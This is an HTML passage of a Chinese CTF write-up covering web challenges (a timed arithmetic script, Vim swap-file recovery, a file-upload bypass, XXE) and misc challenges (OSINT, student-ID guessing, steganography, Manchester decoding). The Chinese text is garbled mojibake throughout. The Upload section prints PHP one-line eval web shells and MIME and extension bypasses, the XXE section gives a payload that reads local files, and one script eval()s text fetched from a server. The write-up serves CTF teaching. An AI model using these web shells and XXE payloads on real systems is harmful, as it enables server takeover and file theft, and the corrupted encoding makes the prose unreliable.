title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜è€ƒæŸ¥PHPå’ŒPythonè„šæœ¬ï¼Œ3ç§’å†…â€¦æœ‰äººèƒ½åšå¾—åˆ°å˜›ï¼Ÿ</p><p>æœ¬é¢˜ç½‘ä¸Šæ‰¾ä¸€ä¸ªè„šæœ¬æ”¹æ”¹å®Œå…¨æ²¡é—®é¢˜ï¼Œå…¶å®è¿˜æœ‰ä¸€é¢˜è®¡ç®—å­—ç¬¦ä¸²ï¼ˆåŸåˆ›é¢˜ç›®å‰ç½‘ä¸Šæ²¡æœ‰è„šæœ¬ï¼‰ï¼Œå¸ˆå‚…ä»¬è¯´ä¸æ”¾å°±æ²¡æ”¾å•¦ï¼Œæœ‰å…´è¶£å¯ä»¥åšåš <a href="http://49.234.89.193:8088/">é¢˜ç›®é“¾æ¥</a>(é“¾æ¥å¯èƒ½ä¼šæŒ‚ï¼Œé¢˜ç›®éšæ—¶å¯èƒ½å“ªå¤©æˆ‘å°±å…³äº†â€¦)</p><h3 id="è§£é¢˜æ–¹å¼-4"><a href="#è§£é¢˜æ–¹å¼-4" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>è¯·åœ¨3ç§’å†…è®¡ç®—ä»¥ä¸‹ç®—å¼å¹¶æäº¤å¹¶æäº¤<br>åœ¨æœåŠ¡å™¨è®¾çš„SESSIONï¼Œ3ç§’åˆ·æ–°ï¼Œè¶…æ—¶ä¹Ÿæ˜¯ä¸ç®—çš„<br>è®¾äº†ä¸ªå°å‘ï¼ŒæŠ“ä¸ªåŒ…å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡æäº¤çš„è¯·æ±‚è¿˜æœ‰ä¸ªå‚æ•°<code>submits=æäº¤</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="å‚æ•°" loading="lazy"><p>å¦‚æœæ²¡æœ‰å°±ä¼šdieé€€å‡º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"å°‘äº†ç‚¹ä¸œè¥¿å•Š...å¥½å¥½çœ‹çœ‹å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æœ€åæ”¾å‡ºPayloadï¼Œå¸ˆå‚…ä»¬å¯ä»¥è‡ªå·±ç ”ç©¶</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2020/11/22 18:14@Auth ï¼š gyy@File ï¼š1.py@Blogï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"æäº¤"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------å–ç®—å¼"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------è®¡ç®—ç®—å¼"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------æäº¤"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum" loading="lazy"><p>æœ¬äººè¹©è„šè‡ªå­¦çš„pythonï¼Œè¯­æ³•è§„èŒƒé—®é¢˜è¯·è§è°…</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="å‡ºé¢˜è§£æ-5"><a href="#å‡ºé¢˜è§£æ-5" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜è€ƒå¯ŸLinuxä¸‹Vimçš„åº”ç”¨ï¼ŒåŒæ—¶è€ƒå¯ŸPHPä»£ç å®¡è®¡åŠrobotsåè®®</p><p>ç»™äº†hintï¼švimå¼ºé€€ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆç”Ÿæˆå¤‡ä»½æ–‡ä»¶</p><h3 id="è§£é¢˜æ–¹å¼-5"><a href="#è§£é¢˜æ–¹å¼-5" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>æ‰“å¼€å…ˆçœ‹æºä»£ç </p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim" loading="lazy"><p>Recover<br>Linuxä¸­ï¼Œå¦‚æœvimå¼ºé€€çš„è¯ï¼ˆctrl+zï¼‰å°±ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z" loading="lazy"><p>è€Œå†vimç¼–è¾‘å°±ä¼šæœ‰å¦‚ä¸‹æç¤º</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re" loading="lazy"><p>ç›´æ¥Recoveræ¢å¤å³å¯ã€‚</p><p>æ ¹æ®æç¤ºï¼Œè®¿é—®./.index.php.swpã€‚å‘ç°ä¸‹è½½.swpæ–‡ä»¶<br>è¿™é‡Œæ³¨æ„ï¼Œå¤‡ä»½æ–‡ä»¶æ˜¯éšè—æ–‡ä»¶ï¼Œæ–‡ä»¶åå‰é¢æœ‰ä¸ªç‚¹<br>æ‹¿å»linuxç³»ç»Ÿæ¢å¤ï¼Œå¯ä»¥å‘ç°</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1" loading="lazy"><p>ç”±æ­¤ï¼Œflagåˆ†ä¸ºå¤šéƒ¨åˆ†<br>æ¥ä¸‹æ¥ä»£ç å®¡è®¡å¾ˆç®€å•ï¼Œå›åˆ°index.phpï¼ŒPOSTä¼ å‚</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2" loading="lazy"><p>æœºå™¨äººä¼šå‘Šè¯‰ä½ å‰©ä¸‹çš„ï¼Œè”æƒ³robotsåè®®ï¼Œè®¿é—®./robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots" loading="lazy"><p>å¯å¾—flagåœ¨./r/o/b/o/a/t/s/1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3" loading="lazy"><p>å°†ä¸‰æ®µflagç»„åˆå³å¯</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="å‡ºé¢˜è§£æ-6"><a href="#å‡ºé¢˜è§£æ-6" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>æœ¬é¢˜è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œè€ƒå¯Ÿä¸Šä¼ ç»•è¿‡çš„å§¿åŠ¿ï¼Œå› ä¸ºæ¯”èµ›é™åˆ¶ï¼Œæ²¡æœ‰å‡ºå¤ªéš¾çš„è¿‡æ»¤</p><h3 id="è§£é¢˜æ–¹å¼-6"><a href="#è§£é¢˜æ–¹å¼-6" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>å½“ç„¶ï¼Œä¸æ˜¯çœŸçš„è®©ä½ ä¸Šä¼ ä¸ªåŠ¨å›¾ã€‚ã€‚æˆ‘æœåŠ¡å™¨é‡Œå‘ç°äº†å¥½å¤šå¥‡å¥‡æ€ªæ€ªçš„å›¾ç‰‡<br>ä¸€èˆ¬æ–‡ä»¶ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ç›´æ¥è·å–shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>éœ€è¦èƒ½è¢«phpè§£ææ‰è¡Œï¼Œ.txt,.giféƒ½æ˜¯ä¸å¯è¢«è§£æçš„<br>æˆ–è€…ç›´æ¥ç”¨scriptæ ‡ç­¾<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>åç¼€åé™åˆ¶</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php" loading="lazy"><p>ä¸Šä¼ æ™®é€šå›¾ç‰‡ï¼Œè¢«è¿‡æ»¤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif" loading="lazy"><p>æŠ“åŒ…ä¸Šä¼ ,åŸå§‹å¦‚ä¸‹</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1" loading="lazy"><p>ä¿®æ”¹å¦‚ä¸‹</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2" loading="lazy"><p>è¯·æ±‚å¤´æ£€æŸ¥ï¼šcontent-typeï¼ŒMIMEç±»å‹é™åˆ¶ï¼Œä¿®æ”¹ä¸º<code>image/gif</code><br>æ–‡ä»¶åç¼€ç»•è¿‡ï¼šåªè¦èƒ½è¢«phpè§£æçš„æ–‡ä»¶åå°±å¯ä»¥<br>è¿™é‡Œæˆ‘åªé™åˆ¶äº†<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIMEç±»å‹é™åˆ¶åªå…è®¸<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload" loading="lazy"><p>ç„¶åè®¿é—®æ–‡ä»¶</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2" loading="lazy"><p>å‘ç°ä»£ç è¢«æ‰§è¡Œäº†ï¼Œç›´æ¥èšå‰‘è¿ä¸Šget shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3" loading="lazy"><p>æ ¹ç›®å½•å‘ç°flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4" loading="lazy"><p>ä½ ä»¬çœŸçš„ä¼ äº†ä¸€å †å †å¥‡å¥‡æ€ªæ€ªçš„å›¾ç‰‡ã€‚ã€‚ã€‚</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="å‡ºé¢˜è§£æ-7"><a href="#å‡ºé¢˜è§£æ-7" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>è€ƒå¯ŸXXEæ³¨å…¥ï¼Œå³ XMLå®ä½“æ³¨å…¥</p><h3 id="è§£é¢˜æ–¹å¼-7"><a href="#è§£é¢˜æ–¹å¼-7" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>æ‰“å¼€ç›´æ¥ç»™phpinfoï¼Œæºä»£ç æœ‰æç¤º</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint" loading="lazy"><p>åº•éƒ¨å‘ç°</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system" loading="lazy"><p>å…¶å®æ˜¯æ‰§è¡Œäº†<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index" loading="lazy"><p>ç„¶åæ¯ä¸ªæ–‡ä»¶éƒ½é«˜äº®äº†è¯­æ³•ï¼Œ<code>dom.php</code>ã€<code>SimpleXMLElement.php</code>ã€<code>simplexml_load_string.php</code>å‡å¯è§¦å‘XXEæ¼æ´ï¼Œå…·ä½“è¾“å‡ºç‚¹è¯·é˜…è¯»è¿™ä¸‰ä¸ªæ–‡ä»¶çš„ä»£ç ã€‚å­˜åœ¨çš„XXEæ¼æ´å…·ä½“å¯ä»¥ç™¾åº¦ç ”ç©¶ä¸€ä¸‹ã€‚<br>æ ·ä¾‹Payloadï¼š</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom" loading="lazy"><p>å…¶å®è¿˜å¯ä»¥åˆ©ç”¨å†™å…¥ä¸€å¥è¯æœ¨é©¬ç­‰æ“ä½œã€‚</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä¿¡æ¯æœç´¢"><a href="#ä¿¡æ¯æœç´¢" class="headerlink" title="ä¿¡æ¯æœç´¢"></a>ä¿¡æ¯æœç´¢</h2><h3 id="å‡ºé¢˜è§£æ-8"><a href="#å‡ºé¢˜è§£æ-8" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>ä¿¡æ¯æœç´¢ä¹Ÿæ˜¯é—¨æŠ€æœ¯ï¼Œå¥½å¥½åˆ©ç”¨æœç´¢å¼•æ“å¯ä»¥è¾¾åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœ.<br>ç¡®å®ï¼Œåªè¦ä»”ç»†æœç´¢ï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜</p><h3 id="è§£é¢˜æ–¹å¼-8"><a href="#è§£é¢˜æ–¹å¼-8" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>æ‰“å¼€äº”é“é¢˜ï¼Œä¸€é“é“è§£å†³</p><h4 id="1-æˆªè‡³2020å¹´10æœˆ31æ—¥ï¼ŒRFCæœ€æ–°çš„æ­£å¼æ–‡æ¡£ç¼–å·æ˜¯å¤šå°‘"><a href="#1-æˆªè‡³2020å¹´10æœˆ31æ—¥ï¼ŒRFCæœ€æ–°çš„æ­£å¼æ–‡æ¡£ç¼–å·æ˜¯å¤šå°‘" class="headerlink" title="1.æˆªè‡³2020å¹´10æœˆ31æ—¥ï¼ŒRFCæœ€æ–°çš„æ­£å¼æ–‡æ¡£ç¼–å·æ˜¯å¤šå°‘?"></a>1.æˆªè‡³2020å¹´10æœˆ31æ—¥ï¼ŒRFCæœ€æ–°çš„æ­£å¼æ–‡æ¡£ç¼–å·æ˜¯å¤šå°‘?</h4><p>RFCæ–‡æ¡£ï¼ŒRequest For Commentsï¼Œå®˜ç½‘è¿<em>ç§‘å­¦ä¸Šç½‘</em>éƒ½ä¸éœ€è¦</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc" loading="lazy"><p>è®¿é—®<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc" loading="lazy"><p>æˆ–è€…ç›´æ¥è®¿é—®RFCæ–‡æ¡£æœç´¢ç½‘ç«™<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc" loading="lazy"><p>æˆªè‡³2020å¹´10æœˆ31æ—¥ï¼Œä¸€æŸ¥</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc" loading="lazy"><p>æœ€æ–°ä¸ºRFC8940<br>è¿™ç§ä¸œè¥¿æœ€æ ‡å‡†è¿˜æ˜¯å»å®˜ç½‘æŸ¥</p><h4 id="2-å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ç¬¬ä¸€å±Šæ˜¯åœ¨å“ªä¸€å¹´ä¸¾è¡Œçš„ï¼Ÿ"><a href="#2-å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ç¬¬ä¸€å±Šæ˜¯åœ¨å“ªä¸€å¹´ä¸¾è¡Œçš„ï¼Ÿ" class="headerlink" title="2.å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ç¬¬ä¸€å±Šæ˜¯åœ¨å“ªä¸€å¹´ä¸¾è¡Œçš„ï¼Ÿ"></a>2.å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ç¬¬ä¸€å±Šæ˜¯åœ¨å“ªä¸€å¹´ä¸¾è¡Œçš„ï¼Ÿ</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014" loading="lazy"><h4 id="3-æœ¬æ ¡æ ¡å›­å¡ä¸Šå¯¹åº”çš„æ•™å­¦æ¥¼æ˜¯ä¸»æ ¡åŒºçš„å‡ å·æ•™å­¦æ¥¼ï¼Ÿ"><a href="#3-æœ¬æ ¡æ ¡å›­å¡ä¸Šå¯¹åº”çš„æ•™å­¦æ¥¼æ˜¯ä¸»æ ¡åŒºçš„å‡ å·æ•™å­¦æ¥¼ï¼Ÿ" class="headerlink" title="3. æœ¬æ ¡æ ¡å›­å¡ä¸Šå¯¹åº”çš„æ•™å­¦æ¥¼æ˜¯ä¸»æ ¡åŒºçš„å‡ å·æ•™å­¦æ¥¼ï¼Ÿ"></a>3. æœ¬æ ¡æ ¡å›­å¡ä¸Šå¯¹åº”çš„æ•™å­¦æ¥¼æ˜¯ä¸»æ ¡åŒºçš„å‡ å·æ•™å­¦æ¥¼ï¼Ÿ</h4><p>æ‹¿å‡ºæ¥çœ‹çœ‹â€¦ç™¾åº¦åœ°å›¾æ‰“å¼€ï¼Œ</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1" loading="lazy"><p>å…¨æ™¯åœ°å›¾</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1" loading="lazy"><p>æœ‰ç‚¹è€ï¼Œä»”ç»†è§‚å¯Ÿåœ°å›¾ï¼Œåªæœ‰1æ•™æœ‰é‚£ä¹ˆå¤§åœ°æ–¹ï¼Œ2æ•™3æ•™éƒ½ä¸ä¼šæœ‰é‚£ä¹ˆå¤§çš„ä¸­å¤®ç©ºåœ°<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1" loading="lazy"><br>good</p><h4 id="4-S3Cæˆ˜é˜Ÿä»£è¡¨å­¦æ ¡åœ¨ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸Šå–å¾—äº†å¤šå°‘åçš„æˆç»©ï¼Ÿ"><a href="#4-S3Cæˆ˜é˜Ÿä»£è¡¨å­¦æ ¡åœ¨ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸Šå–å¾—äº†å¤šå°‘åçš„æˆç»©ï¼Ÿ" class="headerlink" title="4. S3Cæˆ˜é˜Ÿä»£è¡¨å­¦æ ¡åœ¨ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸Šå–å¾—äº†å¤šå°‘åçš„æˆç»©ï¼Ÿ"></a>4. S3Cæˆ˜é˜Ÿä»£è¡¨å­¦æ ¡åœ¨ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸Šå–å¾—äº†å¤šå°‘åçš„æˆç»©ï¼Ÿ</h4><p>33<br>æ‹›æ–°PPTä¸Šå†™çš„ï¼Œå­¦æ ¡å…¬ä¼—å·ä¹Ÿèƒ½æŸ¥åˆ°</p><h4 id="5-æˆªè‡³ç›®å‰æœ€æ–°çš„Cè¯­è¨€æ ‡å‡†æ˜¯Cå¤šå°‘ï¼Ÿ"><a href="#5-æˆªè‡³ç›®å‰æœ€æ–°çš„Cè¯­è¨€æ ‡å‡†æ˜¯Cå¤šå°‘ï¼Ÿ" class="headerlink" title="5. æˆªè‡³ç›®å‰æœ€æ–°çš„Cè¯­è¨€æ ‡å‡†æ˜¯Cå¤šå°‘ï¼Ÿ"></a>5. æˆªè‡³ç›®å‰æœ€æ–°çš„Cè¯­è¨€æ ‡å‡†æ˜¯Cå¤šå°‘ï¼Ÿ</h4><p>18<br>Cæ ‡å‡†ä»¥å¹´å·ç»“å°¾å‘½åï¼Œæœ‰äººé—®ä¸ºä»€ä¹ˆä¸æ˜¯C99,C11â€¦.æˆ‘åªèƒ½è¯´ï¼Œç°åœ¨æœ€æ–°çš„æ˜¯C18ï¼Œç™¾åº¦å¥½å¥½æŸ¥æŸ¥å§â€¦ï¼ˆ2å¹´äº†ï¼‰</p><p>å…¨éƒ¨ç­”å¯¹ç»™flagï¼Œä¸è¡Œçˆ†ç ´ä¹Ÿè¡Œ</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="å‡ºé¢˜è§£æ-9"><a href="#å‡ºé¢˜è§£æ-9" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>ç¤¾å·¥å¤§ä½¬ï¼Œæ€•äº†æ€•äº†</p><h3 id="è§£é¢˜æ–¹å¼-9"><a href="#è§£é¢˜æ–¹å¼-9" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>åŸæœ¬è€ƒçˆ†ç ´çš„ï¼Œåæ¥å¹²è„†ç›´æ¥ä½ ä»¬ç¤¾å·¥ç®—äº†â€¦</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id" loading="lazy"><p>æ‰“å¼€å»æ‰disableæ ‡ç­¾</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id" loading="lazy"><p>ä¸‹é¢æç¤º</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id" loading="lazy"><p>åŸæ¥æƒ³è€ƒçˆ†ç ´ï¼Œæœ€åéƒ½çŸ¥é“äº†â€¦idæ˜¯æˆ‘å­¦å·ï¼Œç›´æ¥å¼€å§‹ç¤¾å·¥ï¼Œç´¢æ€§æ”¹åˆ†ç±»ä¸ºMISCã€‚<br>å†ç»™ä¸ªhintï¼š<code>è®¡ç®—æœºé™¢ 2019 æ‡‚ï¼Ÿ</code><br>é¦–å…ˆ2019çº§å³å‰5ä½ä¸º<code>12019</code><br>è®¡ç®—æœºé™¢ä¸º050-055(å¤§æ¦‚ï¼‰<br>æ‰€ä»¥å‰å…«ä½<code>1201905x</code>ï¼Œçˆ†ç ´ä¸€ä¸‹å°±å¥½äº†ã€‚<br>å½“ç„¶ä¹Ÿæœ‰é—®å­¦é•¿å­¦å§çš„ï¼Œé—®å¢™çš„ï¼Œç¿»æˆ‘ç©ºé—´çš„ï¼ŒæŸ¥å­¦æ ¡åå†Œçš„ï¼Œéƒ½å¯ä»¥ã€‚è¿™é¢˜å°±å½“ç©ç©233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id" loading="lazy"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="å‡ºé¢˜è§£æ-10"><a href="#å‡ºé¢˜è§£æ-10" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>è€ƒå¯Ÿå·¥å…·åˆ©ç”¨ä»¥åŠæŸ¥çœ‹å±æ€§</p><h3 id="è§£é¢˜æ–¹å¼-10"><a href="#è§£é¢˜æ–¹å¼-10" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>å°æˆˆ:give me a flag ä¸€çœ‹å±æ€§ç«Ÿç„¶ç”¨ SteganPEG è€Œä¸”è¿˜æ²¡é‚£ä¹ˆç®€å•</p><p>æç¤ºå¾ˆæ˜æ˜¾ï¼Œç”¨è½¯ä»¶ SteganPEG ï¼Œå¯†ç å°±æ˜¯<code>givemeaflag</code>ï¼ˆç”Ÿæ€•ä½ ä»¬çœ‹ä¸è§ï¼‰ï¼Œå…¶å®æ­£è§„åœ°æ–¹åœ¨æ–‡ä»¶çš„å±æ€§é‡Œ</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag" loading="lazy"><p>è½¯ä»¶è¯»æ–‡ä»¶</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag" loading="lazy"><p>æ‹–å‡ºæ¥æ‰“å¼€å°±æ˜¯flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="å‡ºé¢˜è§£æ-11"><a href="#å‡ºé¢˜è§£æ-11" class="headerlink" title="å‡ºé¢˜è§£æ"></a>å‡ºé¢˜è§£æ</h3><p>è€ƒå¯Ÿ å­¦ä¹ ç†è§£èƒ½åŠ› ç™¾åº¦æ›¼å½»æ–¯ç‰¹ç¼–ç </p><h3 id="è§£é¢˜æ–¹å¼-11"><a href="#è§£é¢˜æ–¹å¼-11" class="headerlink" title="è§£é¢˜æ–¹å¼"></a>è§£é¢˜æ–¹å¼</h3><p>å¤§ç™½è¯è§£é‡Šï¼šä½ç”µå¹³æ˜¯0ï¼Œé«˜ç”µå¹³æ˜¯1ã€‚<br>æ›¼å½»æ–¯ç‰¹ç¼–ç <code>01-&gt;1</code> <code>10-&gt;0</code><br>å½“æ—¶å‡ºè¿™é¢˜ç”¨çš„Cå†™çš„ï¼Œè¹©è„šçš„ä¸œè¥¿çœ‹çœ‹å°±å¥½â€¦</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 